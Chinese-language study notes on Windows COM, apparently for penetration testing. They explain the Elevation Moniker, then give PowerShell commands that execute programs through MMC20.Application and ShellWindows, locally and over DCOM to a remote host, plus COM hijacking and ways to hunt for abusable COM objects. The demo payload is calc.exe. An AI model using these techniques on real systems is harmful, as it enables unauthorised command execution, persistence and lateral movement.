- [计划任务相关](https://yuque.antfin.com/chenqiyuan.cqy/eqqz7q/pdkxl9u1smkx0u5n "计划任务相关") 由于计划任务也通过COM组件实现，这里的文章也与COM组件相关
- [com组件的从0-1 - 跳跳糖](https://tttang.com/archive/1824/) 这篇写得很详细，基础知识和利用都有说明
- [The COM Elevation Moniker - Win32 apps](https://learn.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)

## 基础知识

### The COM Elevation Moniker

#### 何时使用Elevation Moniker

用于在有UAC的上下文中提权执行COM组件

提权需要COM组件和客户端两边的配合。COM组件侧需要配置相关的注册表（见下文），COM客户端则需要使用elevation moniker进行提权

如果要将旧版COM组件（如WinWord）提权运行，则应将COM客户端配置为需要提权运行，而不是使用elevation moniker激活这些旧版COM程序的类。当提权后的COM客户端使用CoCreateInstance激活旧版COM组件时，客户端的提权状态将流向COM组件服务器进程

不是所有COM组件都与提权运行功能兼容

- 权限提升状态无法从客户端流向远程服务器，若一个客户端使用elevation moniker激活远程的COM服务器，即使COM组件本身支持提权也无法运行
- 若COM组件本身使用了模拟令牌，在使用模拟令牌时会失去自己提升的权限
- 如果一个提权的COM服务器在ROT（Running Object Table）注册了一个类，这个类对于非提权的客户端来说不可用
- 一个使用UAC机制提权的进程在激活COM时不会加载per-user class。这意味着若一个COM组件会同时被特权与非特权账号使用，则必须注册在HKEY_LOCAL_MACHINE中，而对于不会被特权账户使用的COM组件可以只注册在HKEY_USERS中
- 非提权到提权程序无法使用拖放（Drag and drop）

#### 要求

为了允许使用elevation moniker激活COM类，类必须被配置为`run as the launching user`或`Activate as Activator`。

该类必须被注册在HKEY_LOCAL_MACHINE

类还必须配置display name

```
HKEY_LOCAL_MACHINE\Software\Classes\CLSID
   {CLSID}
      LocalizedString = displayName
```

必须配置Elevation表项

```
HKEY_LOCAL_MACHINE\Software\Classes\CLSID
   {CLSID}
      Elevation
         Enabled = 1
```

此外可以选择配置图标

```
HKEY_LOCAL_MACHINE\Software\Classes\CLSID
   {CLSID}
      Elevation
         IconReference = applicationIcon
```

其中资源定位字串使用该格式`@*pathtobinary*,*-resourcenumber*`

#### 使用方法

在命令行中可以使用下列语法激活Elevation Moniker

```
Elevation:Administrator!new:{guid}
Elevation:Highest!new:{guid}
```

也可以用下列语法获取实现了IClassFactory接口的类对象

```
Elevation:Administrator!clsid:{guid}
```

示例代码如下

```
HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, __out void ** ppv)
{
    BIND_OPTS3 bo;
    WCHAR  wszCLSID[50];
    WCHAR  wszMonikerName[300];

    StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID)/sizeof(wszCLSID[0])); 
    HRESULT hr = StringCchPrintf(wszMonikerName, sizeof(wszMonikerName)/sizeof(wszMonikerName[0]), L"Elevation:Administrator!new:%s", wszCLSID);
    if (FAILED(hr))
        return hr;
    memset(&bo, 0, sizeof(bo));
    bo.cbStruct = sizeof(bo);
    bo.hwnd = hwnd;
    bo.dwClassContext  = CLSCTX_LOCAL_SERVER;
    return CoGetObject(wszMonikerName, &bo, riid, ppv);
}
```

#### Over-The-Shoulder (OTS) Elevation

指客户端使用一个管理员凭据运行COM服务器，而非客户端本身的凭据

在非OTS方案中，COM服务器可能不会调用CoInitializeSecurity，对于此类服务器，COM会计算一个安全描述符，该安全描述符只允许SELF SYSTEM和Builtin\Administrators的调用

在OTS方案中，则需要显式或隐式调用CoInitializeSecurity，并指定包含INTERACTIVE组SID和SYSTEM的ACL

#### COM权限和强制访问标签（Mandatory Access Label）

强制访问标签在Vista后引入，用于指示客户端是否可以获取对COM对象的执行访问权限，在SACL中指定。如将COM组件标识为低完整性等级，那么低完整性等级的客户端就可以激活该COM组件

#### CoCreateInstance和完整性级别

- 启动COM服务器进程时，服务器进程令牌的完整性等级设置为客户端和服务端中完整性等级较低者的
- 默认情况下，COM会阻止低完整性等级的客户端绑定到任何COM服务器实例，除非COM的激活安全描述符（注册表中的LaunchPermission字段）必须包含低完整性等级标签的SACL

## 攻击方法

### COM直接利用

#### 命令执行

枚举COM对象

```powershell
gwmi Win32_COMSetting | ? { $_.progid } | sort | ft ProgId,Caption,InprocServer32
```

COM对象创建（powershell）

```powershell
$handle = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1"))
$handle | Get-Member
```

常用于命令执行的COM组件

```powershell
# MMC
$handle = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1"))
$handle.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")

# ShellWindows
$hb = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39")) 
$item = $hb.Item() 
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)

$shell = [Activator]::CreateInstance([type]::GetTypeFromCLSID("72C24DD5-D70A-438B-8A42-98424B88AFB8"))
$shell.Run("calc.exe")
```

#### 计划任务

见计划任务相关攻击方法文档（也在该目录下）

#### 进程注入

[GitHub - mdsecactivebreach/com_inject](https://github.com/mdsecactivebreach/com_inject)

### COM劫持

COM的加载顺序为

```
HKCU\Software\Classes\CLSID
HKCR\CLSID
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\shellCompatibility\Objects\
```

因此也存在类似DLL劫持的问题

#### 利用缺失的CLSID

通过ProcMon查找对注册表中对含InprocServer32的键的访问，若发现没找到对应CLSID的情况则创建对应键并写入恶意dll/exe

缺点是需要管理员权限

#### 覆盖COM键

可以使用oleview过滤程序启动权限为空的COM组件，可以直接覆盖其InprocServer32键

### COM注册表滥用

#### LocalServer32

列举本地或远程的COM接口，且LocalServer32不为null

```powershell
gwmi Win32_COMSetting | ?{$_.LocalServer32 -ne $null}
gwmi Win32_COMSetting -computername 127.0.0.1 | ?{$_.LocalServer32 -ne $null}
```

寻找其对应值的文件不存在的情况，且查看对应文件夹权限是否可以写入。若可以写入则可以劫持该COM组件

#### InprocServer32

类似，但劫持的是dll

```powershell
gwmi Win32_COMSetting | ?{$_.LocalServer32 -ne $null}
```

若遇到可写的dll路径，可以使用下属命令启动对应COM组件

```
rundll32 -sta {CLSID}
```

### DCOM横移

一般调用DCOM连接远程计算机时，已经具有本地管理员的权限

枚举支持DCOM的程序

```powershell
Get-CimInstance -class Win32_DCOMApplication | select appid,name
```

使用DCOM执行命令

```powershell
# MMC
# 创建COM对象
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "192.168.1.1"))
# 查看方法
$com.Document.ActiveView | gm
# 执行命令
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc","Minimzed")

# ShellWindows
$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.1.1")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe","c:\windows\system32",$null, 0)
```

还有一些其他的DCOM

```
Methods                     APPID
MMC20.Application           7e0423cd-1119-0928-900c-e6d4a52a0715
ShellWindows                9BA05972-F6A8-11CF-A442-00A0C90A8F39
ShellBrowserWindow          C08AFD90-F2A1-11D1-8455-00A0C91F3880


Document.Application.ServiceStart()
Document.Application.ServiceStop()
Document.Application.IsServiceRunning()
Document.Application.ShutDownWindows()
Document.Application.GetSystemInformation()
```

可以使用oleview查找Launch Permission为空的DCOM，来找到普通权限可执行的DCOM组件

### COM挖掘

#### 已公开的COM对象

遍历COM组件及其导出方法

```powershell
# 创建一个powershell虚拟磁盘映射到HKEY_CLASSES_ROOT
New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
# 获取虚拟磁盘下CLSID所有文件夹
Get-ChildItem -Path HKCR:\CLSID -Name
```

通过CLSID创建COM对象并获取成员

```powershell
$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
$handle | Get-Member
```

之后可以查找关键词，如execute exec spawn launch run等

#### 未公开的COM对象

对于这类接口，可能看不到对应的方法和参数，此时就需要去逆向找到其使用方法，如找一个接口是否调用了CreateProcess

#### 自动化挖掘

[GitHub - nickvourd/COM-Hunter: COM Hijacking VOODOO](https://github.com/nickvourd/COM-Hunter)


